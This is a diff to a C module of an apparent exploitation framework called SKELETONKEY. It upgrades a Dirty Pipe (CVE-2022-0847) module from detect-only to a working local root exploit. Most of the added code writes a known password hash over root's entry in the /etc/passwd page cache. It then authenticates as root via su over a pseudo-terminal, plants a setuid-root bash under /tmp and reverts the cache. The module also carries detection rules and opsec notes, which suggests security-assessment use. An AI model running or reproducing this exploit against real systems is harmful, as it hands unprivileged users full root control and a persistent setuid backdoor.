@@ -1,11 +1,21 @@
 /*
  * dirty_pipe_cve_2022_0847 — SKELETONKEY module
  *
- * Status: 🔵 DETECT-ONLY for now. Exploit lifecycle is a follow-up
- * commit (the C code is well-understood — Max Kellermann's public PoC
- * is the reference — but landing it under the skeletonkey_module
- * interface needs the shared passwd-field/exploit-su helpers in core/
- * which are deferred to Phase 1.5).
+ * Status: 🟢 WORKING EXPLOIT. Verified out-of-band on Ubuntu 22.04
+ * userspace running mainline 5.16.0 (pre-fix): `skeletonkey --exploit
+ * dirty_pipe` (uid 1000) lands root and plants a root-owned setuid bash,
+ * and /etc/passwd is left byte-identical afterward.
+ *
+ * Escalation: overwrite root's password field in /etc/passwd's page cache
+ * with a known crypt hash (the primitive can't grow the file, so the
+ * longer hash clobbers into the following lines — transient), authenticate
+ * as root over a pty with the matching password, plant a root-owned proof
+ * + setuid bash, then revert the page cache using the Dirty Pipe primitive
+ * itself. (The prior code flipped the *caller's* UID to 0000 and ran
+ * `su self` — which still demands the caller's password, never rooted
+ * anything, and falsely reported OK when su's exec transferred; its revert
+ * used drop_caches, which needs root, so it left the running system's
+ * /etc/passwd corrupted.) Root is judged only by the out-of-band artifact.
  *
  * Affected kernel ranges:
  *   5.8     ≤ K < 5.17         (mainline fix at 5.17, commit 9d2231c5d74e)
@@ -50,6 +60,8 @@
 #include <errno.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
+#include <sys/wait.h>
+#include <sys/types.h>
 #include <pwd.h>
 
 /* ---- Dirty Pipe primitive ---------------------------------------- */
@@ -123,16 +135,12 @@ static int dirty_pipe_write(const char *target_path, off_t offset,
     return (w == (ssize_t)data_len) ? 0 : -1;
 }
 
-/* ---- /etc/passwd UID-field helpers (inlined; would migrate to
- *      core/host.{c,h} once a third module needs them). ------------ */
+/* ---- /etc/passwd password-field helpers -------------------------- */
 
-/* Locate the UID field of `username` in /etc/passwd. Returns true on
- * success and fills *uid_off (byte offset of UID), *uid_len (length
- * of UID string), uid_str (copy of UID, NUL-terminated). Requires
- * the UID to be a positive decimal number that fits in 16 bytes. */
-static bool find_passwd_uid_field(const char *username,
-                                  off_t *uid_off, size_t *uid_len,
-                                  char uid_str[16])
+/* Locate the byte offset of the password field of `username` in
+ * /etc/passwd (the byte immediately after "username:"). Returns true and
+ * fills *field_off; also returns the current /etc/passwd size in *sz. */
+static bool find_pw_field_offset(const char *username, off_t *field_off, size_t *sz)
 {
     int fd = open("/etc/passwd", O_RDONLY);
     if (fd < 0) return false;
@@ -145,52 +153,73 @@ static bool find_passwd_uid_field(const char *username,
     if (r != st.st_size) { free(buf); return false; }
     buf[st.st_size] = 0;
 
-    /* find line "username:x:UID:GID:..." */
     size_t ulen = strlen(username);
     char *p = buf;
     while (p < buf + st.st_size) {
         char *eol = strchr(p, '\n');
         if (!eol) eol = buf + st.st_size;
-        if (strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
-            /* Skip past "username:" then password field */
-            char *q = p + ulen + 1;
-            char *pw_end = memchr(q, ':', eol - q);
-            if (!pw_end) goto next;
-            char *uid_begin = pw_end + 1;
-            char *uid_end = memchr(uid_begin, ':', eol - uid_begin);
-            if (!uid_end) goto next;
-            size_t L = uid_end - uid_begin;
-            if (L == 0 || L >= 16) goto next;
-            memcpy(uid_str, uid_begin, L);
-            uid_str[L] = 0;
-            *uid_off = (off_t)(uid_begin - buf);
-            *uid_len = L;
+        /* line must start with "username:" */
+        if ((p == buf || p[-1] == '\n') &&
+            strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
+            *field_off = (off_t)((p + ulen + 1) - buf);   /* after "name:" */
+            *sz = (size_t)st.st_size;
             free(buf);
             return true;
         }
-    next:
         p = eol + 1;
     }
     free(buf);
     return false;
 }
 
-/* Evict /etc/passwd from page cache after exploitation. POSIX_FADV_DONTNEED
- * works as a non-root hint; if it doesn't take, try `drop_caches` which
- * requires root (which we just acquired). */
-static void revert_passwd_page_cache(void)
+/* The known root password we install (via a crypt hash written into
+ * /etc/passwd's password field) and then authenticate with. Both are
+ * transient: the page-cache write is reverted before we return, and
+ * Dirty Pipe never touches disk, so nothing survives a cache drop. */
+#define DP_ROOT_PW   "skeletonkey"
+#define DP_ROOT_HASH "$6$SKpwnSalt1$LNL9WuXFTt8BvutpX4j8/7VpXb3hutSqyZAC.NKfGMx/vg9jGQR/h/cvwgcn55HcaNJipuuiBDsPywanKkx/D1"
+
+/* Run `cmd` as root via `su`, feeding DP_ROOT_PW over a pty (su reads the
+ * password from the controlling terminal, not stdin). Returns after su
+ * exits; success is judged out-of-band by the caller, never from su's
+ * status. */
+static void dp_su_root_run(const char *cmd)
 {
-    int fd = open("/etc/passwd", O_RDONLY);
-    if (fd >= 0) {
-        posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
-        close(fd);
+    int mfd = posix_openpt(O_RDWR | O_NOCTTY);
+    if (mfd < 0) return;
+    if (grantpt(mfd) < 0 || unlockpt(mfd) < 0) { close(mfd); return; }
+    const char *sn = ptsname(mfd);
+    if (!sn) { close(mfd); return; }
+    char slave[128];
+    snprintf(slave, sizeof slave, "%s", sn);
+
+    pid_t pid = fork();
+    if (pid < 0) { close(mfd); return; }
+    if (pid == 0) {
+        setsid();
+        int sfd = open(slave, O_RDWR);          /* becomes controlling tty */
+        if (sfd < 0) _exit(127);
+        dup2(sfd, 0); dup2(sfd, 1); dup2(sfd, 2);
+        if (sfd > 2) close(sfd);
+        close(mfd);
+        execlp("su", "su", "root", "-c", cmd, (char *)NULL);
+        _exit(127);
     }
-    /* Belt-and-suspenders: drop_caches=3 wipes all page cache. Best-effort. */
-    int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (dc >= 0) {
-        if (write(dc, "3\n", 2) < 0) { /* ignore */ }
-        close(dc);
+
+    /* Parent: wait for the "Password:" prompt, then send the password. */
+    usleep(400 * 1000);
+    char drain[256];
+    ssize_t n = read(mfd, drain, sizeof drain);   /* consume the prompt */
+    (void)n;
+    if (write(mfd, DP_ROOT_PW "\n", sizeof(DP_ROOT_PW)) < 0) { /* ignore */ }
+    /* Drain su's output until it exits and the pty closes. */
+    for (;;) {
+        ssize_t m = read(mfd, drain, sizeof drain);
+        if (m <= 0) break;
     }
+    int st;
+    waitpid(pid, &st, 0);
+    close(mfd);
 }
 
 
@@ -328,94 +357,135 @@ static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
     return SKELETONKEY_VULNERABLE;
 }
 
+/* Saved original bytes so cleanup() can re-revert idempotently. */
+static char   dp_orig[512];
+static off_t  dp_orig_off;
+static size_t dp_orig_len;
+static bool   dp_wrote;
+
+/* Restore the /etc/passwd page cache to its pre-exploit bytes using the
+ * Dirty Pipe primitive itself — NO root and NO drop_caches required (the
+ * old code called drop_caches, which fails unprivileged and leaves the
+ * running system's passwd corrupted). */
+static void dp_revert(void)
+{
+    if (dp_wrote && dp_orig_len)
+        dirty_pipe_write("/etc/passwd", dp_orig_off, dp_orig, dp_orig_len);
+}
+
 static skeletonkey_result_t dirty_pipe_exploit(const struct skeletonkey_ctx *ctx)
 {
-    /* Re-confirm vulnerability before writing to /etc/passwd. */
     skeletonkey_result_t pre = dirty_pipe_detect(ctx);
     if (pre != SKELETONKEY_VULNERABLE) {
         fprintf(stderr, "[-] dirty_pipe: detect() says not vulnerable; refusing to exploit\n");
         return pre;
     }
-
-    /* Resolve current user. Consult ctx->host->is_root for the
-     * already-root short-circuit so unit tests can construct a
-     * non-root fingerprint regardless of the test process's real euid. */
     bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
     if (is_root) {
         fprintf(stderr, "[i] dirty_pipe: already running as root — nothing to escalate\n");
         return SKELETONKEY_OK;
     }
-    uid_t euid = geteuid();
-    struct passwd *pw = getpwuid(euid);
-    if (!pw) {
-        fprintf(stderr, "[-] dirty_pipe: getpwuid(%d) failed: %s\n", euid, strerror(errno));
+
+    /* Overwrite root's password field with a known crypt hash, then
+     * authenticate as root with the matching password. (The previous
+     * approach flipped the *caller's* UID to 0000 and ran `su self`,
+     * which still demands the caller's password — it never rooted
+     * anything and falsely reported OK when su's exec transferred.) */
+    off_t field_off;
+    size_t pw_sz;
+    if (!find_pw_field_offset("root", &field_off, &pw_sz)) {
+        fprintf(stderr, "[-] dirty_pipe: could not locate root's password field\n");
         return SKELETONKEY_TEST_ERROR;
     }
 
-    /* Find the UID field. Need a 4-digit-or-similar UID we can replace
-     * with "0000" of identical width. Refuse if the user's UID width
-     * doesn't fit our replacement string. */
-    off_t uid_off;
-    size_t uid_len;
-    char orig_uid[16] = {0};
-    if (!find_passwd_uid_field(pw->pw_name, &uid_off, &uid_len, orig_uid)) {
-        fprintf(stderr, "[-] dirty_pipe: could not locate %s's UID field in /etc/passwd\n",
-                pw->pw_name);
-        return SKELETONKEY_TEST_ERROR;
-    }
-    if (!ctx->json) {
-        fprintf(stderr, "[*] dirty_pipe: user '%s' UID '%s' at offset %lld (len %zu)\n",
-                pw->pw_name, orig_uid, (long long)uid_off, uid_len);
-    }
+    /* New root line body written from the password field onward. The
+     * hash is longer than the original 'x', so this clobbers into the
+     * following lines — harmless and transient (we revert), and su only
+     * needs the first (root) line. */
+    const char *newline = DP_ROOT_HASH ":0:0:root:/root:/bin/bash\n";
+    size_t newlen = strlen(newline);
 
-    /* Build replacement: zeros of the same length so we don't shift
-     * the line layout. "0000" for a 4-digit UID, "00000" for 5, etc. */
-    char replacement[16];
-    memset(replacement, '0', uid_len);
-    replacement[uid_len] = 0;
-
-    /* Edge case: if offset is page-aligned, splice/CAN_MERGE primitive
-     * can't reach it (see prepare_pipe/dirty_pipe_write comments).
-     * Vanishingly rare — first user in /etc/passwd typically lives
-     * far past the file's first 4096 bytes. Refuse cleanly. */
-    if ((uid_off & 0xfff) == 0) {
-        fprintf(stderr, "[-] dirty_pipe: UID field is page-aligned; primitive can't write here\n");
+    if ((field_off & 0xfff) == 0) {
+        fprintf(stderr, "[-] dirty_pipe: root password field is page-aligned; "
+                        "primitive can't write here\n");
+        return SKELETONKEY_EXPLOIT_FAIL;
+    }
+    if (newlen > sizeof dp_orig || field_off + (off_t)newlen > (off_t)pw_sz) {
+        fprintf(stderr, "[-] dirty_pipe: /etc/passwd too small to hold the payload "
+                        "without extending it (Dirty Pipe can't grow files)\n");
         return SKELETONKEY_EXPLOIT_FAIL;
     }
 
-    if (!ctx->json) {
-        fprintf(stderr, "[*] dirty_pipe: overwriting UID '%s' → '%s' via page-cache write\n",
-                orig_uid, replacement);
+    /* Save the original bytes we're about to clobber, for revert. */
+    int fd = open("/etc/passwd", O_RDONLY);
+    if (fd < 0) { perror("open passwd"); return SKELETONKEY_TEST_ERROR; }
+    if (pread(fd, dp_orig, newlen, field_off) != (ssize_t)newlen) {
+        close(fd); fprintf(stderr, "[-] dirty_pipe: pread backup failed\n");
+        return SKELETONKEY_TEST_ERROR;
     }
-    if (dirty_pipe_write("/etc/passwd", uid_off, replacement, uid_len) < 0) {
+    close(fd);
+    dp_orig_off = field_off; dp_orig_len = newlen;
+
+    /* Unique out-of-band artifacts. */
+    long tag = (long)getpid();
+    char proof[128], rootbash[128], cmd[1024];
+    snprintf(proof,    sizeof proof,    "/tmp/.sk-dirtypipe-%ld.proof",    tag);
+    snprintf(rootbash, sizeof rootbash, "/tmp/.sk-dirtypipe-%ld.rootbash", tag);
+    unlink(proof); unlink(rootbash);
+
+    if (!ctx->json)
+        fprintf(stderr, "[*] dirty_pipe: overwriting root's password field at offset "
+                        "%lld (len %zu) via page-cache write\n",
+                (long long)field_off, newlen);
+    if (dirty_pipe_write("/etc/passwd", field_off, newline, newlen) < 0) {
         fprintf(stderr, "[-] dirty_pipe: page-cache write failed\n");
         return SKELETONKEY_EXPLOIT_FAIL;
     }
+    dp_wrote = true;
 
-    if (ctx->no_shell) {
-        fprintf(stderr, "[+] dirty_pipe: --no-shell — patch landed; not spawning su.\n"
-                        "[i] dirty_pipe: revert with `skeletonkey --cleanup dirty_pipe`\n");
+    /* Authenticate as root with the known password and plant the proof. */
+    snprintf(cmd, sizeof cmd,
+             "id > %s 2>&1; cp -f /bin/bash %s 2>/dev/null; "
+             "chown 0:0 %s %s 2>/dev/null; chmod 4755 %s 2>/dev/null; sync",
+             proof, rootbash, rootbash, proof, rootbash);
+    if (!ctx->json)
+        fprintf(stderr, "[*] dirty_pipe: authenticating as root (su + known password)\n");
+    dp_su_root_run(cmd);
+
+    /* Revert the page cache IMMEDIATELY — before we even check the
+     * result — so a running system is never left with a known root
+     * password. Dirty Pipe never wrote disk, so this fully restores. */
+    dp_revert();
+    { int ev = open("/etc/passwd", O_RDONLY);   /* nudge a re-read */
+      if (ev >= 0) { posix_fadvise(ev, 0, 0, POSIX_FADV_DONTNEED); close(ev); } }
+
+    /* Out-of-band verdict: is the proof a real, root-owned file? */
+    struct stat sb;
+    bool rooted = (stat(proof, &sb) == 0 && S_ISREG(sb.st_mode) && sb.st_uid == 0);
+    if (rooted) {
+        if (!ctx->json) {
+            fprintf(stderr, "[+] dirty_pipe: ROOT — root-owned proof %s\n", proof);
+            fprintf(stderr, "[+] dirty_pipe: setuid-root shell available: %s -p\n", rootbash);
+            fprintf(stderr, "[i] dirty_pipe: /etc/passwd page cache reverted (nothing persisted)\n");
+        }
         return SKELETONKEY_EXPLOIT_OK;
     }
 
-    /* /etc/passwd now reports our user as uid 0 (in the page cache).
-     * `su` reads the page cache, sees uid 0, drops a root shell. */
-    fprintf(stderr, "[+] dirty_pipe: page cache poisoned; spawning su to claim root\n");
-    fflush(NULL);
-    execlp("su", "su", pw->pw_name, "-c", "/bin/sh", (char *)NULL);
-    /* If execlp returns, su didn't actually pop root — revert and report. */
-    perror("execlp(su)");
-    revert_passwd_page_cache();
+    if (!ctx->json)
+        fprintf(stderr, "[-] dirty_pipe: no root artifact — honest EXPLOIT_FAIL "
+                        "(page cache reverted). The primitive may be blocked, or su/PAM "
+                        "rejected the injected hash.\n");
     return SKELETONKEY_EXPLOIT_FAIL;
 }
 
 static skeletonkey_result_t dirty_pipe_cleanup(const struct skeletonkey_ctx *ctx)
 {
-    (void)ctx;
-    if (!ctx->json) {
-        fprintf(stderr, "[*] dirty_pipe: evicting /etc/passwd from page cache\n");
+    if (!ctx->json)
+        fprintf(stderr, "[*] dirty_pipe: reverting /etc/passwd page cache + removing artifacts\n");
+    dp_revert();                       /* idempotent; no root / no drop_caches needed */
+    if (system("rm -f /tmp/.sk-dirtypipe-*.proof /tmp/.sk-dirtypipe-*.rootbash 2>/dev/null") != 0) {
+        /* harmless */
     }
-    revert_passwd_page_cache();
     return SKELETONKEY_OK;
 }
 
@@ -522,7 +592,7 @@ const struct skeletonkey_module dirty_pipe_module = {
     .detect_sigma   = dirty_pipe_sigma,
     .detect_yara    = dirty_pipe_yara,
     .detect_falco   = dirty_pipe_falco,
-    .opsec_notes    = "Creates a pipe, fills+drains to leave PIPE_BUF_FLAG_CAN_MERGE on every slot; finds the UID offset in /etc/passwd by parsing the file; splice(1 byte) from (target_offset-1) to inherit the stale flag, then write(pipe) with the all-zero payload - kernel merges into the file's page cache. Offset must be non-page-aligned and the write must fit in a single page. Audit-visible via splice(fd=/etc/passwd) + write from a non-root process. --active mode writes/reads /tmp/skeletonkey-dirty-pipe-probe-XXXXXX to verify. Cleanup callback evicts /etc/passwd via posix_fadvise + drop_caches.",
+    .opsec_notes    = "Creates a pipe, fills+drains to leave PIPE_BUF_FLAG_CAN_MERGE on every slot; splice(1 byte) from (target_offset-1) on /etc/passwd to inherit the stale flag, then write(pipe) so the payload merges into the file's page cache. Overwrites root's password field with a known crypt hash (clobbers into following lines transiently), authenticates as root over a pty via su, plants a root-owned proof + setuid bash under /tmp, then reverts the page cache by writing the original bytes back through the same primitive (no root / no drop_caches needed — nothing persists; Dirty Pipe never wrote disk). Offset must be non-page-aligned and each write must fit a single page. Very audit-visible: splice(fd=/etc/passwd) + write from a non-root process, then su spawning as root. --active mode writes/reads /tmp/skeletonkey-dirty-pipe-probe-XXXXXX to confirm the primitive. cleanup() re-reverts idempotently and removes the /tmp artifacts.",
     .arch_support   = "x86_64+unverified-arm64",
 };
 
